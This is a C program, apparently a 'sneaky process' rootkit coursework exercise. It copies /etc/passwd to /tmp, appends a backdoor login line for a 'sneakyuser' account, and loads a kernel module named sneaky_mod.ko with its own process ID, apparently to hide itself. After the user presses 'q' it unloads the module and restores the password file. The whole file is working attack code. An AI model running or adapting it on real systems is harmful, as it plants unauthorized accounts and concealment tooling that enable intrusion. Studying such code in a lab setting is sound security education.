#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

//copy the /etc/passwd to /tmp/passwd
void copyFile(const char *src_name, const char *dest_name){
    FILE *src_file = fopen(src_name, "r");
    FILE *dest_file = fopen(dest_name, "w");
    if (src_file == NULL) {
        printf("Fail to open the file:/etc/passwd");
        exit(EXIT_FAILURE);
    }
    if (dest_file == NULL) {
        printf("Fail to open the file:/tmp/passwd");
        exit(EXIT_FAILURE);
    }
    //copy the content from source to destination file
    char c;
    c = fgetc(src_file);
    while (c != EOF) {
        fputc(c, dest_file);
        c = fgetc(src_file);
    }
    fclose(src_file);
    fclose(dest_file);
}

//print a new line to the end of the file that contains a username 
//and password that may allow a desired user to authenticate to the system
void printNewline(const char *file_name, char *new_line){
    FILE * file = fopen(file_name, "a");
    if (file == NULL) {
        printf("Fail to open the file:/etc/passwd");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s", new_line);
    fclose(file);
}

int main(){
    //1. print the process ID
    printf("sneaky_process pid = %d\n", getpid());
    //2. copy the /etc/passwd to /tmp/passwd and print a new line to the end of the file
    copyFile("/etc/passwd", "/tmp/passwd");
    printNewline("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    //3. load the sneaky module by insmod, pass its process ID into the module
    char command_arg[50];
    sprintf(command_arg, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(command_arg);
    //4. enter a loop, read from the keyboard until it receives 'q'
    char c;
    c = getchar();
    while(c != 'q'){
        c = getchar();
    }
    //5. unload sneaky kernel module by rmmod
    system("rmmod sneaky_mod.ko");
    // c = getchar();
    // while(c != 'q'){
    //     c = getchar();
    // }
    //6. restore /etc/passwd, copy /tmp/passwd to /etc/passwd
    //and remove the addition of “sneakyuser” authentication information
    copyFile("/tmp/passwd", "/etc/passwd");
    system("rm /tmp/passwd"); 

    return EXIT_SUCCESS;
}